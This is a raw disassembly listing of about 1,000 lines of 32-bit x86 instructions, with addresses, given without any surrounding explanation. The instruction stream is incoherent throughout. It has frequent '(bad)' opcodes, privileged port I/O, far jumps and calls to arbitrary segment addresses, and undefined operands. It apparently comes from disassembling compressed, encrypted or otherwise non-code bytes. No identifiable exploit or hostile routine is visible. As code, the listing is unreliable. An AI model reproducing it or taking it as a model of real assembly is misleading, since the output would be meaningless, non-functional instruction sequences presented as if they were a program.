  4193b9:	aam    0xe3
  4193bb:	shl    ebx,0xd5
  4193be:	push   ebp
  4193bf:	inc    esp
  4193c0:	das    
  4193c1:	cmp    ah,dl
  4193c3:	es and dh,ch
  4193c6:	cdq    
  4193c7:	mov    ss,WORD PTR [eax-0x76]
  4193ca:	push   ds
  4193cb:	mov    ecx,0x4bfd9460
  4193d0:	jp     0x419352
  4193d2:	xchg   edi,eax
  4193d3:	out    0x50,al
  4193d5:	arpl   bp,bp
  4193d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d8:	pop    edi
  4193d9:	mov    BYTE PTR [edx+0x76122762],al
  4193df:	fldcw  WORD PTR [ecx+0x50886f8d]
  4193e5:	xchg   esi,eax
  4193e6:	add    dh,dl
  4193e8:	pop    es
  4193e9:	sub    ebp,esi
  4193eb:	stos   DWORD PTR es:[edi],eax
  4193ec:	xor    al,0x37
  4193ee:	dec    ecx
  4193ef:	jecxz  0x41939e
  4193f1:	xchg   ecx,eax
  4193f2:	imul   edi,DWORD PTR [edx],0xf6d7bba2
  4193f8:	mov    WORD PTR [edx+0x1],?
  4193fb:	fbld   TBYTE PTR [esi+eiz*2]
  4193fe:	in     eax,dx
  4193ff:	pushf  
  419400:	mov    eax,edx
  419402:	fstp   DWORD PTR [ebx+0x35]
  419405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419406:	fcmovnb st,st(2)
  419408:	xchg   edi,eax
  419409:	sub    DWORD PTR [eax],ebp
  41940b:	mov    al,ds:0xf7882c46
  419410:	stos   DWORD PTR es:[edi],eax
  419411:	and    DWORD PTR [ecx+0x55d2a936],esi
  419417:	and    DWORD PTR [esi-0x4ec6a9c1],edi
  41941d:	push   edx
  41941e:	xchg   ebp,eax
  41941f:	push   ebx
  419420:	pop    ebp
  419421:	clc    
  419422:	into   
  419423:	inc    esp
  419424:	sbb    al,0x89
  419426:	sahf   
  419427:	jne    0x419455
  419429:	adc    dl,BYTE PTR ds:[ebx]
  41942c:	sbb    al,0x80
  41942e:	adc    dl,BYTE PTR [ecx]
  419430:	jl     0x419481
  419432:	and    DWORD PTR [edx],edx
  419434:	jmp    0x9215:0xfa7d0992
  41943b:	or     dh,BYTE PTR [esi]
  41943d:	in     al,dx
  41943e:	xchg   edx,eax
  41943f:	pusha  
  419440:	push   ecx
  419441:	jns    0x419458
  419443:	jmp    0x4193e2
  419445:	in     al,0xec
  419447:	sbb    edx,DWORD PTR [ebx+0x1]
  41944a:	test   al,0x8f
  41944c:	int    0x3b
  41944e:	xor    eax,0x70b0d32c
  419453:	pop    edi
  419454:	loopne 0x419480
  419456:	mov    ecx,0x6d3811bd
  41945b:	pop    eax
  41945d:	ja     0x4193e8
  41945f:	in     al,0x97
  419461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419462:	pop    edx
  419463:	call   0x44974fc5
  419468:	xchg   edi,eax
  419469:	fild   WORD PTR [di-0x7]
  41946d:	pop    esp
  41946e:	mov    eax,0x91ec522c
  419473:	pusha  
  419474:	or     eax,0x40953b7e
  419479:	outs   dx,BYTE PTR ds:[esi]
  41947a:	mov    edx,0xac00f530
  41947f:	adc    BYTE PTR [eax+eax*1],ah
  419482:	rcl    BYTE PTR [ebx-0x35acd500],cl
  419488:	popf   
  419489:	ja     0x419420
  41948b:	sbb    esi,DWORD PTR [eax+0x49a0af8b]
  419491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419492:	add    al,0xb4
  419494:	(bad)  
  419495:	sbb    ch,BYTE PTR [ebx*8+0x6df74159]
  41949c:	lods   eax,DWORD PTR ds:[esi]
  41949d:	xor    eax,0xf262eb49
  4194a2:	dec    BYTE PTR [esi]
  4194a4:	(bad)  
  4194a5:	test   eax,0x2c23af43
  4194aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ab:	sub    eax,ebp
  4194ad:	call   0x853c:0x20e38f58
  4194b4:	add    DWORD PTR [eax],ebx
  4194b6:	or     al,0x99
  4194b8:	bound  eax,QWORD PTR [eax]
  4194ba:	mov    edx,ebx
  4194bc:	inc    eax
  4194bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194be:	or     eax,0xe442a69e
  4194c3:	inc    ecx
  4194c4:	jno    0x41946e
  4194c6:	xchg   DWORD PTR [eax+ebx*2+0x17],eax
  4194ca:	adc    ch,BYTE PTR [edi+0x3f47fcc8]
  4194d0:	pop    esi
  4194d1:	push   edi
  4194d2:	jg     0x419456
  4194d4:	sub    BYTE PTR [ebx+0x47],ah
  4194d7:	xor    BYTE PTR [ecx+0x76655556],dh
  4194dd:	bound  eax,QWORD PTR [ebp+0x66]
  4194e0:	pop    ebp
  4194e1:	sbb    ch,BYTE PTR [edx-0x7e]
  4194e4:	loopne 0x41950d
  4194e6:	push   esi
  4194e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194e8:	mov    ch,0xb9
  4194ea:	sub    eax,0x12b28ee
  4194ef:	ins    DWORD PTR es:[edi],dx
  4194f0:	jp     0x41949e
  4194f2:	pop    eax
  4194f3:	push   ecx
  4194f4:	rcr    DWORD PTR [esi+0x185ca6b9],cl
  4194fa:	sub    eax,0x5792e22
  4194ff:	or     eax,0x35641b49
  419504:	ins    BYTE PTR es:[edi],dx
  419505:	push   DWORD PTR [esi-0x59656bf5]
  41950b:	jae    0x41955b
  41950d:	mov    cl,0x16
  41950f:	add    bl,0x67
  419512:	adc    esi,DWORD PTR [edx+0x1fbf0296]
  419518:	inc    eax
  419519:	test   dl,0xc5
  41951c:	cs dec ebx
  41951e:	mov    ds:0xb35d99af,eax
  419523:	push   edi
  419524:	mov    DWORD PTR [edx-0x5c5da586],esi
  41952a:	push   ecx
  41952b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41952c:	push   esp
  41952d:	shl    BYTE PTR [esi],cl
  41952f:	out    0x47,al
  419531:	inc    eax
  419532:	sahf   
  419533:	ins    DWORD PTR es:[edi],dx
  419534:	add    eax,0x651595f1
  419539:	dec    edi
  41953a:	out    dx,eax
  41953b:	into   
  41953c:	rcl    BYTE PTR [ebx],1
  41953e:	loop   0x4194d0
  419540:	out    0xe0,eax
  419542:	xlat   BYTE PTR ds:[ebx]
  419543:	mov    al,0xcc
  419545:	xchg   ebp,eax
  419546:	xchg   ebp,edx
  419548:	sti    
  419549:	retf   
  41954a:	jne    0x419544
  41954c:	and    al,BYTE PTR [eax]
  41954e:	scas   al,BYTE PTR es:[edi]
  41954f:	mov    ebx,0x752cc95a
  419554:	push   eax
  419555:	xchg   ebp,eax
  419556:	cmc    
  419557:	daa    
  419558:	daa    
  419559:	xchg   ebp,eax
  41955a:	stos   DWORD PTR es:[edi],eax
  41955b:	int    0xc1
  41955d:	shl    DWORD PTR [ecx+edx*8+0x6b86f93],cl
  419564:	cmp    ax,0xd4fd
  419568:	or     DWORD PTR [edi+0x72ab5e48],eax
  41956e:	jecxz  0x41958d
  419570:	jmp    0x7138353f
  419575:	jno    0x419544
  419577:	mov    DWORD PTR [esi],ecx
  419579:	and    cl,dl
  41957b:	jb     0x4195a1
  41957d:	mov    edx,0xe9bcf7b6
  419582:	mov    al,0xe4
  419584:	adc    ebp,DWORD PTR [ecx]
  419586:	cli    
  419587:	xchg   edi,eax
  419588:	test   DWORD PTR [ecx],edx
  41958a:	sbb    DWORD PTR [edi+0x2f],eax
  41958d:	or     DWORD PTR [ecx-0x54e6a650],ebx
  419593:	inc    edi
  419594:	mov    edx,0x1db43b57
  419599:	out    0xdf,al
  41959b:	and    BYTE PTR [eax-0x6e],0xf
  41959f:	inc    ebp
  4195a0:	jb     0x4195e3
  4195a2:	mov    edi,0x9121310
  4195a7:	jmp    0x59697714
  4195ac:	mov    ebp,0xe25e7af4
  4195b1:	push   ds
  4195b2:	int    0x84
  4195b4:	and    eax,0x14d80177
  4195b9:	cs jmp 0x981a1232
  4195bf:	les    ebx,FWORD PTR [eiz*4+0x292c03eb]
  4195c6:	nop
  4195c7:	xchg   esi,eax
  4195c8:	int3   
  4195c9:	gs inc ecx
  4195cb:	mov    ch,0x66
  4195cd:	ficomp DWORD PTR [eax-0x2626f3e2]
  4195d3:	push   esi
  4195d4:	mov    esp,edi
  4195d6:	xchg   edi,eax
  4195d7:	in     al,dx
  4195d8:	mov    esp,0xab7193e2
  4195dd:	jbe    0x419634
  4195df:	jae    0x4195ae
  4195e1:	hlt    
  4195e2:	lods   al,BYTE PTR ds:[esi]
  4195e3:	or     BYTE PTR [eax-0x5a2b1b87],cl
  4195e9:	push   eax
  4195ea:	lock jmp 0xf86c9f35
  4195f0:	inc    edx
  4195f1:	sbb    al,0x2
  4195f3:	into   
  4195f4:	ret    0x474c
  4195f7:	mov    edi,0xd4342540
  4195fc:	vpsllq xmm7,xmm4,XMMWORD PTR [edi-0x56a285e5]
  419604:	jle    0x4195e1
  419606:	push   esp
  419607:	mov    ah,0xc1
  419609:	retf   
  41960a:	fcmovnbe st,st(3)
  41960c:	add    eax,0xbf42fc40
  419611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419612:	(bad)  
  419613:	or     eax,0xcf375c95
  419618:	push   ss
  419619:	adc    eax,0x18859656
  41961e:	out    0xc6,eax
  419620:	or     ch,bl
  419622:	aad    0xed
  419624:	xor    ecx,eax
  419626:	inc    ebp
  419627:	push   cs
  419628:	(bad)  
  419629:	out    0x25,al
  41962b:	cmp    BYTE PTR [edi],0x37
  41962e:	std    
  41962f:	loope  0x41969b
  419631:	mov    ebx,0x2c4b0eff
  419636:	mov    DWORD PTR [ecx+0x72],ebx
  419639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963a:	xchg   esp,eax
  41963b:	mov    bl,0x18
  41963d:	xlat   BYTE PTR ds:[ebx]
  41963e:	fild   DWORD PTR [edi+0x7aae6740]
  419644:	sbb    al,0xca
  419646:	inc    ecx
  419647:	add    cl,BYTE PTR [eax]
  419649:	mov    dh,0xf7
  41964b:	mov    WORD PTR [edi+0x883cb82],?
  419651:	jmp    0xe98f:0x6ce169c3
  419658:	push   ss
  419659:	and    ah,BYTE PTR [ebx+0x65]
  41965c:	mov    cl,0xfc
  41965e:	adc    al,0x69
  419660:	and    al,0x93
  419662:	sbb    esi,DWORD PTR [eax+0x2a]
  419665:	lea    ebp,[eax]
  419667:	add    ebp,ecx
  419669:	test   eax,0x7343515
  41966f:	jg     0x41967d
  419671:	or     dh,ah
  419673:	mov    dh,0xe4
  419675:	(bad)  
  419676:	ins    DWORD PTR es:[edi],dx
  419677:	and    edi,DWORD PTR [edx+0x5a]
  41967a:	lods   al,BYTE PTR ds:[esi]
  41967b:	lahf   
  41967c:	xchg   ecx,eax
  41967d:	sbb    al,bl
  41967f:	add    BYTE PTR [ebp+0x1f],cl
  419682:	mov    cl,0x8e
  419684:	mov    WORD PTR [esi-0x79b5f762],?
  41968a:	cmp    ch,BYTE PTR [ecx+0x4b30f094]
  419690:	push   ebp
  419691:	ret    
  419692:	ds push cs
  419694:	sub    al,0x27
  419696:	and    dl,cl
  419698:	adc    ebx,DWORD PTR [eax-0x2a72dbec]
  41969e:	dec    edi
  41969f:	sub    eax,0xc8f735f4
  4196a4:	fstp   QWORD PTR [edx]
  4196a6:	add    bh,BYTE PTR [ecx+0x558d6ed1]
  4196ac:	jmp    0x5764:0x5c23256a
  4196b3:	add    edx,DWORD PTR [si]
  4196b6:	jl     0x419650
  4196b8:	fs mov ecx,0xc4975c0
  4196be:	xchg   edx,eax
  4196bf:	xchg   edi,eax
  4196c0:	sub    eax,0xf36d6382
  4196c5:	add    DWORD PTR [edx-0x4c846502],ebx
  4196cb:	mov    ecx,0xb96a6ff8
  4196d0:	mov    ds:0x2f70003e,eax
  4196d5:	ret    
  4196d6:	cwde   
  4196d7:	xor    al,0x1a
  4196d9:	sbb    BYTE PTR [ebp+0x212a406c],cl
  4196df:	or     al,0xd
  4196e1:	jl     0x4196b4
  4196e3:	xchg   edi,ebp
  4196e5:	or     DWORD PTR [eax-0x3a],edx
  4196e8:	sbb    bl,BYTE PTR [esi]
  4196ea:	jg     0x419749
  4196ec:	sti    
  4196ed:	fstp   TBYTE PTR [ecx+eax*2]
  4196f0:	push   edx
  4196f1:	fldcw  WORD PTR [edx+eiz*8]
  4196f4:	loopne 0x419743
  4196f6:	nop
  4196f7:	dec    edi
  4196f8:	arpl   WORD PTR [eax],ax
  4196fa:	mov    eax,ds:0x71cee2d5
  4196ff:	mov    dh,0x5a
  419701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419702:	divps  xmm4,XMMWORD PTR ds:0x599f7b4b
  419709:	repnz in al,0x64
  41970c:	int    0xae
  41970e:	mov    dl,BYTE PTR [eax]
  419710:	(bad)  
  419711:	mov    ebp,DWORD PTR [edi+ebx*8+0x64095d19]
  419718:	xor    BYTE PTR [edx-0x4a],0x6e
  41971c:	xor    edi,DWORD PTR [ebx-0x2a96cf10]
  419722:	mul    ebp
  419724:	repnz gs push eax
  419727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419728:	xchg   ecx,eax
  419729:	mov    eax,0xee1d3753
  41972e:	pushf  
  41972f:	mov    ch,0xdd
  419731:	div    cl
  419733:	or     DWORD PTR [ecx+0x2fe9eb6f],edi
  419739:	push   ss
  41973a:	imul   eax,DWORD PTR [ecx],0xffffff91
  41973d:	adc    BYTE PTR [esi-0x208cb52e],ah
  419743:	push   esi
  419744:	or     ch,al
  419746:	jbe    0x4196fd
  419748:	sub    al,0x2d
  41974a:	mov    eax,0x9ae76f4
  41974f:	ds jns 0x4196d2
  419752:	neg    DWORD PTR [edi]
  419754:	cmp    ah,BYTE PTR [edi+0x2f88b01b]
  41975a:	dec    esi
  41975b:	call   0xfa9f32d3
  419760:	cmc    
  419761:	and    eax,0x70a5ea65
  419766:	cmp    al,0x7
  419768:	xor    al,0xc0
  41976a:	loopne 0x41970e
  41976c:	cmp    ch,0x80
  41976f:	cdq    
  419770:	pop    ds
  419771:	aad    0xd7
  419773:	outs   dx,DWORD PTR ds:[esi]
  419774:	in     eax,dx
  419775:	cmp    edx,esp
  419777:	mov    esp,DWORD PTR [edi-0x73]
  41977a:	imul   DWORD PTR [ebp+ebp*4+0x35]
  41977e:	xchg   ecx,eax
  41977f:	fnstcw WORD PTR [ebp+0x39]
  419782:	jmp    0x41979f
  419784:	scas   al,BYTE PTR es:[edi]
  419785:	pusha  
  419786:	inc    ax
  419788:	xchg   edi,eax
  419789:	xchg   esi,eax
  41978a:	mov    eax,fs
  41978c:	xchg   ebp,eax
  41978d:	mov    eax,ds:0x43acf1e3
  419792:	sub    DWORD PTR [eax],esi
  419794:	mov    bh,0x72
  419796:	dec    ebx
  419797:	test   DWORD PTR [esi+0x14c2ac2d],eax
  41979d:	xchg   bh,cl
  41979f:	xor    eax,0xca983b22
  4197a4:	jb     0x419735
  4197a6:	ret    0xbf23
  4197a9:	push   cs
  4197aa:	mov    edx,ecx
  4197ac:	xor    ch,BYTE PTR [edi-0x75b178eb]
  4197b2:	inc    eax
  4197b3:	fs sar esp,1
  4197b6:	dec    ecx
  4197b7:	adc    al,BYTE PTR [ebp+0x72]
  4197ba:	mov    ds:0x5e1bcf34,al
  4197bf:	adc    BYTE PTR ds:0x9eb1facc,ah
  4197c5:	mov    cl,0x41
  4197c7:	cwde   
  4197c8:	fs jmp 0x4197f6
  4197cb:	fisttp WORD PTR [ebp+ebp*4+0x32a4ab32]
  4197d2:	repz push esi
  4197d4:	pop    esp
  4197d5:	sbb    DWORD PTR [eax+edi*2+0xa],ecx
  4197d9:	retf   0xef62
  4197dc:	or     BYTE PTR [ecx],al
  4197de:	mov    al,0x6c
  4197e0:	ds pop edx
  4197e2:	jmp    0x4197b3
  4197e4:	add    esp,ebx
  4197e6:	(bad)  
  4197e7:	cdq    
  4197e8:	mov    ebp,0x51cfe7e6
  4197ed:	pop    edx
  4197ee:	lea    esp,[esi+0x63]
  4197f1:	outs   dx,DWORD PTR ds:[esi]
  4197f2:	mov    dh,0x3d
  4197f4:	mov    BYTE PTR [edi],0x78
  4197f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f8:	xor    eax,0xaed33f8b
  4197fd:	addr16 inc ecx
  4197ff:	sub    al,0x74
  419801:	adc    DWORD PTR [eax+0xb68afe0],ebp
  419807:	and    eax,0x557be4ff
  41980c:	pop    edx
  41980d:	xor    eax,0xfe10dbf3
  419812:	popa   
  419813:	dec    eax
  419814:	dec    edi
  419815:	jns    0x419887
  419817:	xchg   ebx,eax
  419818:	dec    edi
  419819:	ja     0x419890
  41981b:	pop    eax
  41981c:	repnz xchg esi,eax
  41981e:	int    0x80
  419820:	aaa    
  419821:	das    
  419822:	jecxz  0x419840
  419824:	shl    BYTE PTR [eax-0x219b485c],1
  41982a:	int3   
  41982b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41982c:	imul   ebp,edi,0xffffff89
  41982f:	pop    ebx
  419830:	and    eax,0xc953de74
  419835:	jmp    0x15c4:0x4433f75f
  41983c:	test   al,0xdf
  41983e:	adc    DWORD PTR [eax-0x12],ecx
  419841:	loop   0x419841
  419843:	add    al,0xc6
  419845:	dec    edx
  419846:	loop   0x419852
  419848:	mov    BYTE PTR [eax-0x13b1ca5b],ah
  41984e:	inc    esi
  41984f:	pop    ds
  419850:	and    al,0x7
  419852:	fisubr WORD PTR [esi-0x54f84b2]
  419858:	add    dh,BYTE PTR [esi]
  41985a:	mov    ch,0x4f
  41985c:	aaa    
  41985d:	sti    
  41985e:	xchg   ecx,ebx
  419860:	(bad)  
  419861:	retf   
  419862:	inc    edi
  419863:	pop    ebx
  419864:	jbe    0x419848
  419866:	and    bh,ch
  419868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419869:	fstp   TBYTE PTR [eax+0xc051e0c]
  41986f:	mov    ch,bh
  419871:	add    al,0x5
  419873:	dec    eax
  419874:	das    
  419875:	lods   eax,DWORD PTR ds:[esi]
  419876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419877:	jbe    0x41986d
  419879:	fldcw  WORD PTR [esi-0x1637c778]
  41987f:	pop    es
  419880:	adc    eax,0x266d46b9
  419885:	ffree  st(0)
  419887:	mov    al,0x21
  419889:	jg     0x4198e0
  41988b:	and    eax,0x964b659a
  419890:	(bad)  
  419891:	test   al,0xe2
  419893:	push   ebp
  419894:	push   ss
  419895:	(bad)  
  419896:	mov    ds:0xfc1af1ac,eax
  41989b:	(bad)  
  41989c:	mov    eax,ds:0xc4bfcb21
  4198a1:	test   DWORD PTR [ecx-0x75],0x4ea3dd3d
  4198a8:	cmp    edx,DWORD PTR [ebx+0x38]
  4198ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ac:	cld    
  4198ad:	aad    0x3f
  4198af:	push   edx
  4198b0:	stos   DWORD PTR es:[edi],eax
  4198b1:	mov    eax,ds:0xef0816da
  4198b6:	popf   
  4198b7:	and    eax,0x9e95de03
  4198bc:	xlat   BYTE PTR gs:[ebx]
  4198be:	dec    eax
  4198bf:	ja     0x41993f
  4198c1:	std    
  4198c2:	sub    bl,BYTE PTR [esi+0x4b]
  4198c5:	inc    ebp
  4198c6:	pushf  
  4198c7:	inc    ebp
  4198c8:	pop    ebp
  4198c9:	cdq    
  4198ca:	push   0xffffffb3
  4198cc:	pop    ebx
  4198cd:	xor    bl,BYTE PTR [ebx]
  4198cf:	leave  
  4198d0:	out    dx,eax
  4198d1:	in     eax,dx
  4198d2:	fwait
  4198d3:	pop    esi
  4198d4:	xchg   ebp,eax
  4198d5:	psrlq  mm2,QWORD PTR [ebp+0x54]
  4198d9:	clc    
  4198da:	das    
  4198db:	clc    
  4198dc:	and    DWORD PTR [edx],0xffffffc1
  4198df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198e0:	jmp    0x57f0:0x77a978c
  4198e7:	adc    ebx,ebp
  4198e9:	sbb    eax,0x6260f4d6
  4198ee:	push   esp
  4198ef:	in     al,0x77
  4198f1:	push   eax
  4198f2:	cmp    DWORD PTR [edx-0x45653cd],ecx
  4198f8:	in     eax,dx
  4198f9:	add    eax,DWORD PTR [esi]
  4198fb:	retf   
  4198fc:	xchg   ebp,eax
  4198fd:	mov    bl,0xab
  4198ff:	xchg   ebx,eax
  419900:	shr    ebp,0x79
  419903:	jle    0x419950
  419905:	test   BYTE PTR [ebx+eiz*1-0x57],ch
  419909:	pop    es
  41990a:	ins    DWORD PTR es:[edi],dx
  41990b:	xchg   ecx,eax
  41990c:	in     eax,dx
  41990d:	psubsb mm2,QWORD PTR [ebp-0x7b]
  419911:	mov    eax,esp
  419913:	xchg   ecx,eax
  419914:	add    BYTE PTR [esp+esi*8-0x60],al
  419918:	test   DWORD PTR [eax+0x3ef1a05b],0x81a693da
  419922:	or     BYTE PTR [edx],dl
  419924:	mov    esi,0x5c5bc2a8
  419929:	mov    ah,0xee
  41992b:	pop    edx
  41992c:	(bad)  
  41992d:	dec    esp
  41992e:	jbe    0x41991c
  419930:	jge    0x419969
  419932:	mov    cl,BYTE PTR [ecx]
  419934:	fs xchg ecx,eax
  419936:	cdq    
  419937:	jl     0x419929
  419939:	mul    DWORD PTR [edx+eax*4]
  41993c:	stos   DWORD PTR es:[edi],eax
  41993d:	out    dx,eax
  41993e:	mov    edx,0xf34512cb
  419943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419944:	pop    edi
  419945:	add    eax,DWORD PTR [ecx]
  419947:	sub    BYTE PTR [ebx],dl
  419949:	cmp    al,0x42
  41994b:	xor    ebp,DWORD PTR [ecx-0x2c]
  41994e:	fiadd  DWORD PTR [ebx]
  419950:	sbb    DWORD PTR [esi],ebx
  419952:	add    ebp,esi
  419954:	outs   dx,DWORD PTR ds:[esi]
  419955:	out    0x67,al
  419957:	dec    ebp
  419958:	test   BYTE PTR [ecx-0x3d4175fd],dl
  41995e:	add    al,0xf
  419960:	push   0xffffffb4
  419962:	ficomp DWORD PTR [edx-0x36]
  419965:	or     BYTE PTR [ecx-0x2f8ef15],dh
  41996b:	aaa    
  41996c:	outs   dx,DWORD PTR ds:[esi]
  41996d:	xchg   edx,eax
  41996e:	jae    0x4198f3
  419970:	repnz push edi
  419972:	ins    DWORD PTR es:[edi],dx
  419973:	sahf   
  419974:	pop    ss
  419975:	jo     0x41992c
  419977:	pop    ds
  419978:	out    dx,al
  419979:	inc    ebp
  41997a:	(bad)  
  41997b:	imul   dh
  41997d:	pop    edx
  41997e:	mov    bl,BYTE PTR [eax-0x53]
  419981:	mov    ds:0x706e347a,al
  419986:	repnz fwait
  419988:	dec    edx
  419989:	dec    ebx
  41998a:	fwait
  41998b:	pop    es
  41998c:	scas   al,BYTE PTR es:[edi]
  41998d:	pop    ebp
  41998e:	mov    WORD PTR [edi],ss
  419990:	ins    DWORD PTR es:[edi],dx
  419991:	imul   ebp,eax,0xc2eeb469
  419997:	or     BYTE PTR [esi],0xa5
  41999a:	fcmovbe st,st(6)
  41999c:	aam    0xc4
  41999e:	push   0x7d
  4199a0:	or     DWORD PTR [edi+0x6c795439],ecx
  4199a6:	jne    0x4199be
  4199a8:	repz fst DWORD PTR [esp+ebx*4]
  4199ac:	popa   
  4199ad:	push   ecx
  4199ae:	pop    ecx
  4199b0:	call   0x546c7464
  4199b5:	fnstsw WORD PTR [ebx+0x1f5b54e0]
  4199bb:	xchg   ebx,eax
  4199bc:	das    
  4199bd:	mov    BYTE PTR [eax],0xb2
  4199c0:	mov    ecx,?
  4199c2:	pusha  
  4199c3:	shl    BYTE PTR [edi-0x6888fffd],0xca
  4199ca:	call   0xb029:0xa9316e06
  4199d1:	mov    eax,0x8d4b327e
  4199d6:	(bad)  
  4199d7:	xchg   esp,eax
  4199d8:	sub    BYTE PTR [edx-0x775b1032],dh
  4199de:	push   ebp
  4199df:	cmp    BYTE PTR [ebp+0x1c439b04],bl
  4199e5:	jbe    0x419988
  4199e7:	xor    eax,0x3c1cb8e5
  4199ec:	adc    eax,0xab9c435d
  4199f1:	(bad)  
  4199f3:	sbb    BYTE PTR [edi],bh
  4199f5:	shl    DWORD PTR [edx],cl
  4199f7:	in     al,0xc9
  4199f9:	imul   ebp,DWORD PTR [edi],0x64216bcf
  4199ff:	pop    esp
  419a00:	pop    ds
  419a01:	sbb    BYTE PTR [ebx],ah
  419a03:	test   edx,ebx
  419a05:	inc    esp
  419a06:	dec    ebp
  419a07:	mov    ah,0x78
  419a09:	scas   al,BYTE PTR es:[edi]
  419a0a:	cmp    BYTE PTR [ecx-0x66],ah
  419a0d:	jge    0x419a10
  419a0f:	pop    ebp
  419a10:	fadd   DWORD PTR [edi-0x22]
  419a13:	adc    eax,esi
  419a15:	or     dl,ah
  419a17:	into   
  419a18:	and    BYTE PTR ds:0xd5a24abe,bl
  419a1e:	mov    ebx,0xbeef39f6
  419a23:	jo     0x419a29
  419a25:	fs sub ah,ah
  419a28:	adc    BYTE PTR [eax],bl
  419a2a:	xor    DWORD PTR [ebx-0x3271da4c],esi
  419a30:	sub    ebx,DWORD PTR [ecx+edi*4]
  419a33:	dec    esi
  419a34:	cdq    
  419a35:	lods   al,BYTE PTR ds:[esi]
  419a36:	mov    ?,WORD PTR [eax+esi*8]
  419a39:	(bad)  
  419a3a:	sbb    ecx,ebp
  419a3c:	sbb    eax,0x7544054b
  419a41:	xchg   ecx,eax
  419a42:	fldcw  WORD PTR ds:0x7d37dfc7
  419a48:	popa   
  419a49:	xchg   DWORD PTR [eax-0x24],ebp
  419a4c:	push   es
  419a4d:	mov    esi,0xb7768f00
  419a52:	cld    
  419a53:	sbb    bh,bh
  419a55:	pop    ds
  419a56:	(bad)  
  419a57:	clc    
  419a58:	and    bl,BYTE PTR [ebp+0x1a]
  419a5b:	sbb    ebp,DWORD PTR [eax-0x40939faa]
  419a61:	and    eax,0x8ef29837
  419a66:	xor    cl,ch
  419a68:	repz push 0x48
  419a6b:	push   ebp
  419a6c:	jg     0x419a91
  419a6e:	jo     0x419aa2
  419a70:	shl    BYTE PTR [edx-0x2ecc257],cl
  419a76:	mov    al,ds:0x77f30e3f
  419a7b:	mov    bh,0x26
  419a7d:	scas   eax,DWORD PTR es:[edi]
  419a7e:	pop    esp
  419a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a80:	repnz adc BYTE PTR [ebx],ch
  419a83:	cs or  al,0xe9
  419a86:	jle    0x419a71
  419a88:	js     0x419aff
  419a8a:	mov    bl,0xf
  419a8c:	outs   dx,BYTE PTR ds:[esi]
  419a8d:	out    0x62,al
  419a8f:	into   
  419a90:	cmp    DWORD PTR [ebp+0x3a6c7989],esp
  419a96:	out    dx,al
  419a97:	outs   dx,BYTE PTR ds:[esi]
  419a98:	xchg   BYTE PTR [edx+0x3cd304ed],dh
  419a9e:	xchg   ecx,esp
  419aa0:	add    bl,dh
  419aa2:	nop
  419aa3:	ins    BYTE PTR es:[edi],dx
  419aa4:	jno    0x419aae
  419aa6:	adc    esi,DWORD PTR [edi-0x37079264]
  419aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aad:	jnp    0x419acc
  419aaf:	adc    ecx,esi
  419ab1:	xor    esi,ebx
  419ab3:	mov    bh,0x2f
  419ab5:	aam    0x28
  419ab7:	mov    bl,0xc5
  419ab9:	xor    eax,0x71eb1397
  419abe:	jbe    0x419b0e
  419ac0:	jge    0x419a6e
  419ac2:	and    dl,BYTE PTR [ecx+eax*4]
  419ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac6:	(bad)  
  419ac7:	jno    0x419a96
  419ac9:	sub    DWORD PTR [esi-0x6f],ebx
  419acc:	fucomip st,st(0)
  419ace:	mov    WORD PTR [ecx+0x5f52f8f0],fs
  419ad4:	pop    esp
  419ad5:	call   0xa2e9:0x5647339b
  419adc:	mov    cl,BYTE PTR [esi]
  419ade:	data16 gs or cl,bl
  419ae2:	ror    esi,0xbc
  419ae5:	and    esp,edi
  419ae7:	jns    0x419b15
  419ae9:	pusha  
  419aea:	push   ebx
  419aeb:	sar    esp,1
  419aed:	popf   
  419aee:	fsub   DWORD PTR [esp+eiz*2]
  419af1:	sbb    al,0x52
  419af3:	mov    WORD PTR [edx+ebp*8],ds
  419af6:	and    BYTE PTR [esi-0x13],dl
  419af9:	adc    esi,DWORD PTR [esi]
  419afb:	stos   DWORD PTR es:[edi],eax
  419afc:	fstp   DWORD PTR [ebx-0x30]
  419aff:	pop    edi
  419b00:	pop    es
  419b01:	jle    0x419b3b
  419b03:	or     al,0x7f
  419b05:	dec    edx
  419b06:	iret   
  419b07:	ret    0x9209
  419b0a:	out    dx,eax
  419b0b:	out    dx,al
  419b0c:	sti    
  419b0d:	mov    cl,0x45
  419b0f:	cmp    esp,ecx
  419b11:	ret    0x4f1e
  419b14:	mov    al,ds:0xd7ac211a
  419b19:	ror    DWORD PTR [esp+ecx*4-0x12f75353],cl
  419b20:	xchg   edx,eax
  419b21:	jmp    0x3676:0xe56b8a8b
  419b28:	idiv   DWORD PTR [eax-0x2887aaa7]
  419b2e:	jae    0x419abb
  419b30:	je     0x419b2c
  419b32:	sub    eax,DWORD PTR [ecx+0x73]
  419b35:	loope  0x419b9a
  419b37:	xchg   ecx,eax
  419b38:	or     BYTE PTR [ebx-0x58],0x61
  419b3c:	call   0x7a68:0x3c5ce16f
  419b43:	mov    bl,0xb1
  419b45:	push   0x22
  419b47:	(bad)  
  419b48:	pop    ebp
  419b49:	inc    ecx
  419b4a:	mov    edi,0x716543c7
  419b4f:	in     eax,dx
  419b50:	(bad)  
  419b51:	in     eax,0xd5
